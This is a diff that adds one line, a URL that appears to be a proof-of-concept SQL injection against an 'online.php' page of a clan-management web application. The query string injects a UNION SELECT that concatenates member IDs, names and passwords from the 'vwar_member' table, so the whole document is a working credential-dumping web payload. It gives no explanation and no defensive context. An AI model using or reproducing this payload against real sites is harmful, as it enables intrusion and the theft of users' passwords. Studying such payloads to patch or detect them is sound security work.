@@ -1,0 +1,2 @@
+http://www.example.com/demo/extra/online.php?n=_member%20WHERE%20memberid=-999%20UNION%20SELECT%200,CONCAT(memberid,0x3A,name,0x3A,password),2%20FROM%20vwar_member%20%20/*
+
